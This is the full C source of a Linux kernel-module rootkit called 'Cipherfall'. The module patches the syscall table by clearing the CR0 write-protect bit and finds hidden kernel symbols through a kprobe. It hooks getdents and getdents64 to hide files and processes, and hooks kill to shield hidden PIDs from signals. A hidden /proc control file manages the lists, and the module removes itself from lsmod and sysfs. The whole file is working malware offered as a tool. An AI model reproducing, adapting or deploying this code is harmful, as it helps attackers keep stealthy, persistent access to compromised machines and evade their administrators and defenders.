/*
 * rootkit.c — Cipherfall LKM Rootkit
 *
 * Capabilities:
 *   - Hides files and directories whose names start with HIDE_FILE_PREFIX
 *     ("rootkit_" by default) from any getdents64 / getdents directory listing.
 *   - Hides additional files or directories by exact name, managed at runtime
 *     via the /proc/rootkit_ctrl write-only control interface.
 *   - Hides processes by PID: numeric entries in /proc/ are removed from
 *     directory listings and any signal delivery to those PIDs is blocked.
 *   - Self-hides at init: removes itself from the module linked list (lsmod,
 *     /proc/modules) and from the kobject tree (/sys/module/).
 *
 * Kernel compatibility:
 *   < 5.7  : kallsyms_lookup_name() is an exported symbol; used directly.
 *   >= 5.7 : symbol unexported; address recovered at runtime via a kprobe
 *            registered on the symbol name (requires CONFIG_KPROBES=y).
 *   < 4.17 : syscall table entries use the direct argument ABI.
 *   >= 4.17: syscall table entries use the pt_regs ABI on x86_64.
 *   Write-protect bypass: CR0.WP bit is cleared via inline asm with a full
 *   memory clobber, bypassing the kernel write_cr0() guard present in 5.x+
 *   and surviving compiler reordering.
 *
 * Hooked syscalls:
 *   __NR_getdents64  — filters file and process directory entries.
 *   __NR_getdents    — same filter for the legacy 32-bit listing syscall
 *                      (compiled only when __NR_getdents is defined).
 *   __NR_kill        — returns -ESRCH for any signal targeting a hidden PID.
 *
 * Control interface (/proc/rootkit_ctrl — write-only, itself hidden):
 *   echo "hide_pid <PID>"     > /proc/rootkit_ctrl
 *   echo "unhide_pid <PID>"   > /proc/rootkit_ctrl
 *   echo "hide_file <name>"   > /proc/rootkit_ctrl
 *   echo "unhide_file <name>" > /proc/rootkit_ctrl
 *
 * Limitations:
 *   - No persistence: state and hooks are lost on reboot.
 *   - After self-hiding, rmmod cannot find the module; hooks survive until
 *     reboot (intentional — an operator must reboot to fully unload).
 *   - /proc/<pid>/exe still points to the real binary for root processes.
 *   - File hiding is listing-only; direct inode access by full path is
 *     unaffected.
 *   - Hiding a directory does not hide its contents when accessed by path.
 *   - If CONFIG_KPROBES=n the module refuses to load on kernels >= 5.7.
 *   - Kernels hardening the syscall table beyond CR0.WP (e.g. hardware-
 *     enforced write protection in some hypervisor configurations) may
 *     require an alternative patching strategy such as ftrace hooking.
 */

#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/version.h>
#include <linux/syscalls.h>
#include <linux/dirent.h>
#include <linux/proc_fs.h>
#include <linux/uaccess.h>
#include <linux/slab.h>
#include <linux/spinlock.h>
#include <linux/string.h>
#include <linux/kobject.h>
#include <linux/list.h>
#include <linux/ptrace.h>
#include <asm/unistd.h>

#if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 7, 0)
# define USE_KPROBES_KALLSYMS
# include <linux/kprobes.h>
typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
static kallsyms_lookup_name_t real_kallsyms_lookup_name;
#endif

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Cipherfall");
MODULE_DESCRIPTION("Cipherfall LKM Rootkit");
MODULE_VERSION("1.0");

#define HIDE_FILE_PREFIX  "rootkit_"
#define CTRL_PROC_NAME    "rootkit_ctrl"
#define MAX_HIDDEN_PIDS   64
#define MAX_HIDDEN_FILES  64
#define MAX_FILENAME_LEN  256

/* ── hidden PID list ──────────────────────────────────────────────────────── */
static pid_t hidden_pids[MAX_HIDDEN_PIDS];
static int   n_hidden_pids;
static DEFINE_SPINLOCK(pids_lock);

/* ── hidden filename list ─────────────────────────────────────────────────── */
static char  hidden_files[MAX_HIDDEN_FILES][MAX_FILENAME_LEN];
static int   n_hidden_files;
static DEFINE_SPINLOCK(files_lock);

/* ── syscall table pointer and saved originals ────────────────────────────── */
static unsigned long *syscall_table;

#if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 17, 0)
typedef asmlinkage long (*orig_getdents64_t)(const struct pt_regs *);
typedef asmlinkage long (*orig_getdents_t)(const struct pt_regs *);
typedef asmlinkage long (*orig_kill_t)(const struct pt_regs *);
#else
typedef asmlinkage long (*orig_getdents64_t)(unsigned int,
    struct linux_dirent64 __user *, unsigned int);
typedef asmlinkage long (*orig_getdents_t)(unsigned int,
    struct linux_dirent __user *, unsigned int);
typedef asmlinkage long (*orig_kill_t)(pid_t, int);
#endif

static orig_getdents64_t orig_getdents64;
static orig_getdents_t   orig_getdents;
static orig_kill_t       orig_kill;

/* old-style dirent not exported from kernel headers */
struct old_linux_dirent {
	unsigned long  d_ino;
	unsigned long  d_off;
	unsigned short d_reclen;
	char           d_name[];
};

/* ── CR0.WP bypass ────────────────────────────────────────────────────────── */
static void disable_wp(void)
{
	asm volatile(
		"mov %%cr0, %%rax\n\t"
		"and $0xfffffffffffeffff, %%rax\n\t"
		"mov %%rax, %%cr0"
		::: "rax", "memory");
}

static void enable_wp(void)
{
	asm volatile(
		"mov %%cr0, %%rax\n\t"
		"or $0x10000, %%rax\n\t"
		"mov %%rax, %%cr0"
		::: "rax", "memory");
}

/* ── kallsyms resolution ──────────────────────────────────────────────────── */
#ifdef USE_KPROBES_KALLSYMS
static int resolve_kallsyms(void)
{
	static struct kprobe kp = {
		.symbol_name = "kallsyms_lookup_name",
	};
	int rc = register_kprobe(&kp);
	if (rc < 0)
		return rc;
	real_kallsyms_lookup_name = (kallsyms_lookup_name_t)kp.addr;
	unregister_kprobe(&kp);
	return 0;
}
# define ksym(name) real_kallsyms_lookup_name(name)
#else
# define ksym(name) kallsyms_lookup_name(name)
#endif

/* ── PID list helpers ─────────────────────────────────────────────────────── */
static void pid_add(pid_t pid)
{
	unsigned long flags;
	spin_lock_irqsave(&pids_lock, flags);
	if (n_hidden_pids < MAX_HIDDEN_PIDS)
		hidden_pids[n_hidden_pids++] = pid;
	spin_unlock_irqrestore(&pids_lock, flags);
}

static void pid_remove(pid_t pid)
{
	unsigned long flags;
	int i;
	spin_lock_irqsave(&pids_lock, flags);
	for (i = 0; i < n_hidden_pids; i++) {
		if (hidden_pids[i] == pid) {
			hidden_pids[i] = hidden_pids[--n_hidden_pids];
			break;
		}
	}
	spin_unlock_irqrestore(&pids_lock, flags);
}

static bool pid_is_hidden(pid_t pid)
{
	unsigned long flags;
	int i;
	bool found = false;
	spin_lock_irqsave(&pids_lock, flags);
	for (i = 0; i < n_hidden_pids && !found; i++)
		found = (hidden_pids[i] == pid);
	spin_unlock_irqrestore(&pids_lock, flags);
	return found;
}

/* ── file list helpers ────────────────────────────────────────────────────── */
static void fname_add(const char *name)
{
	unsigned long flags;
	spin_lock_irqsave(&files_lock, flags);
	if (n_hidden_files < MAX_HIDDEN_FILES)
		strncpy(hidden_files[n_hidden_files++], name, MAX_FILENAME_LEN - 1);
	spin_unlock_irqrestore(&files_lock, flags);
}

static void fname_remove(const char *name)
{
	unsigned long flags;
	int i;
	spin_lock_irqsave(&files_lock, flags);
	for (i = 0; i < n_hidden_files; i++) {
		if (strncmp(hidden_files[i], name, MAX_FILENAME_LEN) == 0) {
			if (i < n_hidden_files - 1)
				memmove(hidden_files[i], hidden_files[i + 1],
				        (n_hidden_files - i - 1) * MAX_FILENAME_LEN);
			n_hidden_files--;
			break;
		}
	}
	spin_unlock_irqrestore(&files_lock, flags);
}

/* ── dirent filter ────────────────────────────────────────────────────────── */
static bool dirent_is_hidden(const char *name)
{
	unsigned long flags;
	const char *p;
	pid_t pid;
	bool is_pid;
	int i;

	if (!name || !*name)
		return false;

	if (strncmp(name, HIDE_FILE_PREFIX, strlen(HIDE_FILE_PREFIX)) == 0)
		return true;

	spin_lock_irqsave(&files_lock, flags);
	for (i = 0; i < n_hidden_files; i++) {
		if (strncmp(hidden_files[i], name, MAX_FILENAME_LEN) == 0) {
			spin_unlock_irqrestore(&files_lock, flags);
			return true;
		}
	}
	spin_unlock_irqrestore(&files_lock, flags);

	pid    = 0;
	is_pid = (*name != '\0');
	for (p = name; *p && is_pid; p++) {
		if (*p < '0' || *p > '9')
			is_pid = false;
		else
			pid = pid * 10 + (*p - '0');
	}

	return is_pid && pid_is_hidden(pid);
}

/* ── getdents64 hook ──────────────────────────────────────────────────────── */
#if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 17, 0)
static asmlinkage long hook_getdents64(const struct pt_regs *regs)
{
	struct linux_dirent64 __user *udirent =
		(struct linux_dirent64 __user *)regs->si;
	long ret = orig_getdents64(regs);
#else
static asmlinkage long hook_getdents64(unsigned int fd,
    struct linux_dirent64 __user *udirent, unsigned int count)
{
	long ret = orig_getdents64(fd, udirent, count);
#endif
	char *kbuf, *walk, *end, *out;
	long new_ret;

	if (ret <= 0)
		return ret;

	kbuf = kmalloc(ret, GFP_KERNEL);
	if (!kbuf)
		return ret;

	if (copy_from_user(kbuf, udirent, ret)) {
		kfree(kbuf);
		return ret;
	}

	walk    = kbuf;
	end     = kbuf + ret;
	out     = kbuf;
	new_ret = 0;

	while (walk < end) {
		struct linux_dirent64 *d = (struct linux_dirent64 *)walk;
		if (!d->d_reclen)
			break;
		if (!dirent_is_hidden(d->d_name)) {
			if (out != walk)
				memmove(out, walk, d->d_reclen);
			out     += d->d_reclen;
			new_ret += d->d_reclen;
		}
		walk += d->d_reclen;
	}

	if (copy_to_user(udirent, kbuf, new_ret))
		new_ret = ret;

	kfree(kbuf);
	return new_ret;
}

/* ── getdents hook (legacy 32-bit compat) ─────────────────────────────────── */
#ifdef __NR_getdents
#if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 17, 0)
static asmlinkage long hook_getdents(const struct pt_regs *regs)
{
	struct old_linux_dirent __user *udirent =
		(struct old_linux_dirent __user *)regs->si;
	long ret = orig_getdents(regs);
#else
static asmlinkage long hook_getdents(unsigned int fd,
    struct old_linux_dirent __user *udirent, unsigned int count)
{
	long ret = orig_getdents(fd, udirent, count);
#endif
	char *kbuf, *walk, *end, *out;
	long new_ret;

	if (ret <= 0)
		return ret;

	kbuf = kmalloc(ret, GFP_KERNEL);
	if (!kbuf)
		return ret;

	if (copy_from_user(kbuf, udirent, ret)) {
		kfree(kbuf);
		return ret;
	}

	walk    = kbuf;
	end     = kbuf + ret;
	out     = kbuf;
	new_ret = 0;

	while (walk < end) {
		struct old_linux_dirent *d = (struct old_linux_dirent *)walk;
		if (!d->d_reclen)
			break;
		if (!dirent_is_hidden(d->d_name)) {
			if (out != walk)
				memmove(out, walk, d->d_reclen);
			out     += d->d_reclen;
			new_ret += d->d_reclen;
		}
		walk += d->d_reclen;
	}

	if (copy_to_user(udirent, kbuf, new_ret))
		new_ret = ret;

	kfree(kbuf);
	return new_ret;
}
#endif /* __NR_getdents */

/* ── kill hook ────────────────────────────────────────────────────────────── */
#if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 17, 0)
static asmlinkage long hook_kill(const struct pt_regs *regs)
{
	if (pid_is_hidden((pid_t)regs->di))
		return -ESRCH;
	return orig_kill(regs);
}
#else
static asmlinkage long hook_kill(pid_t pid, int sig)
{
	if (pid_is_hidden(pid))
		return -ESRCH;
	return orig_kill(pid, sig);
}
#endif

/* ── /proc/rootkit_ctrl write interface ───────────────────────────────────── */
static ssize_t ctrl_write(struct file *file, const char __user *buf,
                          size_t count, loff_t *ppos)
{
	char kbuf[320];
	char cmd[32], arg[MAX_FILENAME_LEN];

	if (count >= sizeof(kbuf))
		return -EINVAL;
	if (copy_from_user(kbuf, buf, count))
		return -EFAULT;
	kbuf[count] = '\0';

	if (sscanf(kbuf, "%31s %255s", cmd, arg) != 2)
		return -EINVAL;

	if (strcmp(cmd, "hide_pid") == 0) {
		int v;
		if (kstrtoint(arg, 10, &v) == 0)
			pid_add((pid_t)v);
	} else if (strcmp(cmd, "unhide_pid") == 0) {
		int v;
		if (kstrtoint(arg, 10, &v) == 0)
			pid_remove((pid_t)v);
	} else if (strcmp(cmd, "hide_file") == 0) {
		fname_add(arg);
	} else if (strcmp(cmd, "unhide_file") == 0) {
		fname_remove(arg);
	}

	return count;
}

#if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 6, 0)
static const struct proc_ops ctrl_pops = {
	.proc_write = ctrl_write,
};
#else
static const struct file_operations ctrl_fops = {
	.owner = THIS_MODULE,
	.write = ctrl_write,
};
#endif

/* ── self-hide ────────────────────────────────────────────────────────────── */
static void module_selfhide(void)
{
	list_del(&THIS_MODULE->list);
	kobject_del(&THIS_MODULE->mkobj.kobj);
	THIS_MODULE->sect_attrs  = NULL;
	THIS_MODULE->notes_attrs = NULL;
}

/* ── syscall table patching ───────────────────────────────────────────────── */
static void hooks_install(void)
{
	disable_wp();
	orig_getdents64 = (orig_getdents64_t)syscall_table[__NR_getdents64];
	orig_kill       = (orig_kill_t)      syscall_table[__NR_kill];
	syscall_table[__NR_getdents64] = (unsigned long)hook_getdents64;
	syscall_table[__NR_kill]       = (unsigned long)hook_kill;
#ifdef __NR_getdents
	orig_getdents              = (orig_getdents_t)syscall_table[__NR_getdents];
	syscall_table[__NR_getdents] = (unsigned long)hook_getdents;
#endif
	enable_wp();
}

static void hooks_remove(void)
{
	disable_wp();
	syscall_table[__NR_getdents64] = (unsigned long)orig_getdents64;
	syscall_table[__NR_kill]       = (unsigned long)orig_kill;
#ifdef __NR_getdents
	syscall_table[__NR_getdents] = (unsigned long)orig_getdents;
#endif
	enable_wp();
}

/* ── module init / exit ───────────────────────────────────────────────────── */
static int __init rootkit_init(void)
{
#ifdef USE_KPROBES_KALLSYMS
	if (resolve_kallsyms() < 0) {
		pr_err("rootkit: kprobe lookup for kallsyms_lookup_name failed\n");
		return -EINVAL;
	}
#endif

	syscall_table = (unsigned long *)ksym("sys_call_table");
	if (!syscall_table) {
		pr_err("rootkit: sys_call_table not found\n");
		return -EINVAL;
	}

#if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 6, 0)
	proc_create(CTRL_PROC_NAME, 0222, NULL, &ctrl_pops);
#else
	proc_create(CTRL_PROC_NAME, 0222, NULL, &ctrl_fops);
#endif

	hooks_install();
	module_selfhide();
	return 0;
}

static void __exit rootkit_exit(void)
{
	hooks_remove();
	remove_proc_entry(CTRL_PROC_NAME, NULL);
}

module_init(rootkit_init);
module_exit(rootkit_exit);
